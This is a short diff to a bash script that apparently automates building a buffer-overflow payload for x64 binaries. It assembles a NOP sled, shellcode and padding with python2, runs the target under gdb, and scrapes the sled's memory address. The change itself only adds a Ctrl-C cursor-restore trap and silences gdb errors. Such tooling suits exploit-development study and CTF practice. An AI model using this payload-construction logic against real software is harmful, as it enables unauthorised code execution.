@@ -16,6 +16,15 @@ then
 	help
 fi
 
+trap ctrl_c INT
+
+function ctrl_c() {
+	# only recovers pointer
+	# not prevent from gdb/python err
+        tput cnorm
+        exit
+}
+
 COL_RED="\e[0;31m"
 COL_GREEN="\e[0;32m"
 COL_END="\e[0m"
@@ -83,7 +92,7 @@ function x64(){
 			echo $shellcode | tr -s '\\' '\\\\'
 			printf "[${COL_GREEN}SHELLCODE SIZE${COL_END}] $p_len\n"
 			printf "[${COL_GREEN}OFFSET${COL_END}] $offset\n"
-			gdb -ex 'set pagination off' -ex "run $(python2 -c 'print("\x90"*'$offset' + "'$shellcode'" + "B"*6)')" -ex 'x/'$end'wx $rsp' $binary --batch | grep '0x90909090' > /tmp/memories
+			gdb -ex 'set pagination off' -ex "run $(python2 -c 'print("\x90"*'$offset' + "'$shellcode'" + "B"*6)')" -ex 'x/'$end'wx $rsp' $binary --batch 2>/dev/null | grep '0x90909090' > /tmp/memories
 
 			# 11p can fail due address loc, needs to be a variable
 			mem=$(sed -n '11p' /tmp/memories | awk '{print $1}' | sed -e 's/0x/\\x/g' | tr -d ':' | sed 's/.\{2\}/&\\x/g' | sed -e 's/..$//g' | sed -e 's/^..//g')
